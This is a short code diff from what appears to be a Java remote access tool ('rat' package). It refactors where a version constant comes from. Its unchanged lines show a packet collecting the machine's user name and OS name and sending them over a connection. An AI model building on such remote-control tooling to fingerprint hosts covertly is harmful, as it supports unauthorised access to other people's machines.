@@ -1,7 +1,7 @@
 package de.sogomn.rat.packet;
 
 import de.sogomn.rat.ActiveConnection;
-import de.sogomn.rat.Ratty;
+import de.sogomn.rat.util.Resources;
 
 public final class InformationPacket extends AbstractPingPongPacket {
 	
@@ -50,7 +50,7 @@ public final class InformationPacket extends AbstractPingPongPacket {
 		type = DATA;
 		name = System.getProperty("user.name");
 		os = System.getProperty("os.name");
-		version = Ratty.VERSION;
+		version = Resources.VERSION;
 		
 		connection.addPacket(this);
 	}
